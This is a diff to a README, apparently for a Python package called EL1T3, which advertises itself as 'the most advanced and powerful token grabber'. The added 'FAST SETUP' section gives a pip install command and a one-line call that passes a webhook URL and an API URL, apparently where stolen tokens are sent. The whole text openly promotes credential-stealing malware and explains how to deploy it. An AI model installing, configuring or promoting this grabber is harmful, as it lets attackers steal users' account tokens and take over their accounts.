@@ -6,5 +6,16 @@
   <a href="https://www.youtube.com/channel/UC09GPm24_rdeOXa5KOmhDnw">YouTube</a> |
   <a href="https://github.com/Its-Vichy">Github</a>
   <br><br>
+  <b>"тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer"</b><br>
+  <br><br>
   <img src="https://media.discordapp.net/attachments/813683001496961065/813783642265747516/6869f4cf0c2f7349903668b562c4e403.gif">
 </p>
+<h1 align="center">FAST SETUP</h1>
+
+- **Install module with**: ``pip install EL1T3``
+
+```py
+from EL1T3 import EL1T3
+
+EL1T3('webhook-url', 'api-url') # api / webhook url can be None
+```
